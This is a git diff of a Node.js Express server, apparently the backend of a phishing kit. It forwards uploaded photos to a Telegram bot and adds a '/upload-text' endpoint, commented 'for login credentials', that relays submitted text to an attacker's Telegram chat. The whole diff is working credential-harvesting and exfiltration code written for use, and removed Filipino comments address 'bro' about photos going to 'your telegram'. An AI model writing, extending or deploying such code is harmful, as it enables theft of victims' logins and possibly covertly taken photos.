@@ -11,6 +11,9 @@ const port = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// JSON parser
+app.use(express.json());
+
 // Multer storage
 const storage = multer.diskStorage({
   destination: 'uploads/',
@@ -23,7 +26,7 @@ const upload = multer({ storage: storage });
 
 app.use(express.static('public'));
 
-// Upload endpoint
+// Upload PHOTO endpoint
 app.post('/upload', upload.single('photo'), async (req, res) => {
   const photoPath = req.file.path;
   console.log('📸 Photo received:', photoPath);
@@ -42,7 +45,6 @@ app.post('/upload', upload.single('photo'), async (req, res) => {
 
     console.log('📬 Telegram response:', response.data);
 
-    // Auto-delete dito bro ng sending kapag na send nasa telegram mo
     fs.unlink(photoPath, (err) => {
       if (err) console.error('❌ Failed to delete file:', photoPath, err);
       else console.log('🗑️ Photo deleted:', photoPath);
@@ -52,13 +54,40 @@ app.post('/upload', upload.single('photo'), async (req, res) => {
   } catch (error) {
     console.error('❌ Telegram error:', error.response?.data || error.message);
 
-    // Dito bro yong mga picture aftersend 
     fs.unlink(photoPath, (err) => {
       if (err) console.error('❌ Failed to delete file:', photoPath, err);
       else console.log('🗑️ Photo deleted:', photoPath);
     });
 
     res.status(500).json({ success: false });
+  }
+});
+
+// Upload TEXT endpoint (for login credentials)
+app.post('/upload-text', async (req, res) => {
+  const { text } = req.body;
+  
+  if (!text) {
+    return res.status(400).json({ success: false, error: 'No text provided' });
+  }
+
+  console.log('📝 Text message received:', text);
+  console.log('➡️ Sending to Telegram...');
+
+  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  try {
+    const response = await axios.post(telegramUrl, {
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: 'HTML'
+    });
+
+    console.log('📬 Telegram response:', response.data);
+    res.json({ success: true });
+  } catch (error) {
+    console.error('❌ Telegram error:', error.response?.data || error.message);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
